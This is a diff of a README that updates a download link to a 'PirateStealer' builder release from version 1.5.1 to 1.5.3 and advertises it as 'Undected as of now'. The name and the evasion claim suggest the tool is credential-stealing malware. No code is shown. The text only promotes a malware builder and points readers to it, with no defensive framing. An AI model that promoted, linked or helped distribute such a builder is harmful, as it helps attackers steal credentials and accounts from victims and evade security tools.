@@ -19,7 +19,7 @@
 - KingFA
 - and others lol
 # PirateStealer 
-# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/tag/1.5.1) (Undected as of now)
+# Click here [Builder](https://github.com/bytixo/PirateStealer/releases/tag/1.5.3) (Undected as of now)
 
 ## Read this please
 I'm not the original owner of this repository
